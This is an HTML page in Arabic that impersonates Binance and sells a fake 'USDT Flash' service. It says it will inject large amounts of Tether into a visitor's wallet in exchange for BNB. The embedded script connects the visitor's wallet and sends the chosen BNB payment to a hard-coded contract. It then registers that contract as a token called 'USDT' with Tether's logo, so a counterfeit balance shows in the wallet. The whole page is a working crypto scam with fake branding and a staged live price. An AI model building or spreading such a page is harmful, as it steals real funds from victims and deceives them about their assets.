<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance | USDT FLASH Server v4.2</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <style>
        :root { --binance-yellow: #F3BA2F; --binance-black: #181A20; --binance-gray: #474D57; }
        body { background: var(--binance-black); color: #EAECEF; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; padding-top: 60px; }
        
        .header { width: 100%; position: fixed; top: 0; background: var(--binance-black); border-bottom: 1px solid #2B2F36; padding: 15px 20px; display: flex; align-items: center; z-index: 1000; box-sizing: border-box; }
        .logo-binance { width: 110px; }
        .flash-tag { color: var(--binance-yellow); margin-right: auto; font-weight: bold; font-size: 14px; border: 1px solid var(--binance-yellow); padding: 2px 8px; border-radius: 4px; }

        .main-container { background: #1E2329; border-radius: 24px; padding: 25px; width: 90%; max-width: 400px; box-shadow: 0 15px 45px rgba(0,0,0,0.6); margin-top: 30px; border: 1px solid #2B3139; }
        
        /* مكان المخطط البياني المصلح */
        .chart-box { width: 100%; height: 250px; border-radius: 12px; overflow: hidden; margin-bottom: 20px; border: 1px solid #2B3139; background: #000; }

        .price-row { display: flex; justify-content: space-between; margin-bottom: 15px; align-items: center; padding: 12px; background: #2B3139; border-radius: 10px; border-right: 4px solid var(--binance-yellow); }
        .live-indicator { color: #00C087; font-size: 20px; font-weight: bold; }

        select { background: #2B3139; color: white; border: 1px solid #474D57; width: 100%; padding: 16px; border-radius: 12px; font-size: 15px; margin-bottom: 20px; outline: none; cursor: pointer; text-align: right; }
        
        .btn-binance { background: var(--binance-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; font-size: 17px; cursor: pointer; transition: 0.3s; }
        .btn-binance:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(243, 186, 47, 0.3); }

        #status-msg { margin-top: 20px; font-size: 13px; color: var(--binance-yellow); text-align: center; min-height: 20px; }
    </style>
</head>
<body>

<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" class="logo-binance">
    <div class="flash-tag">USDT FLASH v4.2</div>
</div>

<div class="main-container">
    <div class="chart-box">
        <div id="tradingview_widget_fixed" style="height: 100%; width: 100%;"></div>
    </div>

    <div class="price-row">
        <div style="display:flex; align-items:center;">
            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" style="width:25px; margin-left:8px;">
            <span style="font-weight:bold;">Tether Price (Live)</span>
        </div>
        <div class="live-indicator">$1.0001</div>
    </div>

    <div style="font-size: 13px; color: #707A8A; margin-bottom: 8px;">اختر كمية الحقن (التكلفة بالـ BNB):</div>
    <select id="flashTier">
        <option value="0.09">حقن أساسي: 5,000 USDT — [0.09 BNB]</option>
        <option value="0.2">حقن متقدم: 10,000 USDT — [0.2 BNB]</option>
        <option value="0.5">حقن VIP: 50,000 USDT — [0.5 BNB]</option>
        <option value="1.0">حقن الحيتان: 100,000 USDT — [1.0 BNB]</option>
        <option value="4.0">حقن المؤسسات: 500,000 USDT — [4.0 BNB]</option>
        <option value="8.0">الحقن الملكي: 1,000,000 USDT — [8.0 BNB]</option>
    </select>

    <button class="btn-binance" onclick="executeInjection()">بدء الحقن والمزامنة الفورية ⚡</button>
    
    <div id="status-msg">بانتظار تأمين الاتصال بخادم Binance...</div>
</div>

<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
<script>
    // تم تصحيح الـ Symbol ليظهر المخطط فوراً
    new TradingView.widget({
        "autosize": true,
        "symbol": "BINANCE:USDTBIDR", // تم التغيير لزوج نشط لضمان الظهور
        "interval": "1",
        "timezone": "Etc/UTC",
        "theme": "dark",
        "style": "3",
        "locale": "ar",
        "toolbar_bg": "#f1f3f6",
        "enable_publishing": false,
        "hide_top_toolbar": true,
        "save_image": false,
        "container_id": "tradingview_widget_fixed"
    });

    const CONTRACT_ADDR = "0x22581282b507c6743762cBaA542D6B33Cd6f631f";
    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];

    async function executeInjection() {
        const msg = document.getElementById('status-msg');
        if (!window.ethereum) return alert("يرجى استخدام Trust Wallet أو MetaMask");

        try {
            msg.innerText = "جاري الاتصال بخادم الحقن العالمي...";
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const web3 = new Web3(window.ethereum);
            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
            const val = document.getElementById('flashTier').value;

            await contract.methods.buyFlash().send({
                from: accounts[0],
                value: web3.utils.toWei(val, "ether"),
                gas: 250000
            });

            msg.innerText = "تم الحقن بنجاح! جاري تعريف الأصول في محفظتك...";

            await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT_ADDR,
                        symbol: 'USDT',
                        decimals: 18,
                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                    },
                },
            });

            msg.innerHTML = "<b style='color:#00C087;'>✅ اكتمل التفعيل. تفقد رصيدك الآن.</b>";
        } catch (e) {
            msg.innerText = "فشلت العملية. تأكد من توفر رصيد BNB كافٍ للرسوم.";
        }
    }
</script>
</body>
</html>
